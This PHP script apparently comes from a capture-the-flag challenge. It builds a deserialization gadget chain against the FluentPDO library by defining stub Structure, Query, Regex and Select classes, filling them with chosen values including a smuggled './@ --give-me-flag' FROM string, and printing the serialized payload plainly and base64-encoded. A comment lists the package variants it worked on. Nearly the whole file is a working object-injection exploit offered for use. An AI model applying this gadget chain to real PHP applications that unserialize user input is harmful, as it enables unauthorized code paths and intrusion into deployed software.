<?php
namespace Envms\FluentPDO {

    class Structure
    {
        public $primaryKey;

        function __construct($primaryKey)
        {

            $this->primaryKey = $primaryKey;
        }
    }

    class Query
    {
        public $structure;

        function __construct($struct)
        {

            $this->structure = $struct;
        }
    }

    class Regex
    {
    }
}

namespace Envms\FluentPDO\Queries {

    class Select
    {
        public $fluent;
        public $regex;
        public $statements;

        function __construct($query, $regex, $statements)
        {
            $this->fluent = $query;
            $this->regex = $regex;
            $this->statements = $statements;
        }
    }
}

namespace {
    $regex = new Envms\FluentPDO\Regex();
    $struct = new Envms\FluentPDO\Structure('p0pp3r_win');
    $query = new Envms\FluentPDO\Query($struct);

    $statements = ['GROUP BY' => ['a:'], 'FROM' => './@ --give-me-flag'];
    $ori_name = new Envms\FluentPDO\Queries\Select($query, $regex, $statements);

    $name = unserialize(serialize($ori_name));

    $name = serialize($name);
    echo $name;
    echo "\n";

    $name = base64_encode(serialize($ori_name));
    echo $name;
    echo "\n";

    echo "envms/fluentpdo\n";

    /* success list */
    // envms/fluentpdo
    // lichtner/fluentpdo
    // fpdo/fluentpdo

    // O:30:"Envms\FluentPDO\Queries\Select":3:{s:6:"fluent";O:21:"Envms\FluentPDO\Query":1:{s:9:"structure";O:25:"Envms\FluentPDO\Structure":1:{s:10:"primaryKey";s:10:"p0pp3r_win";}}s:5:"regex";O:21:"Envms\FluentPDO\Regex":0:{}s:10:"statements";a:2:{s:8:"GROUP BY";a:1:{i:0;s:2:"a:";}s:4:"FROM";s:18:"./@ --give-me-flag";}}

    die();
}

?>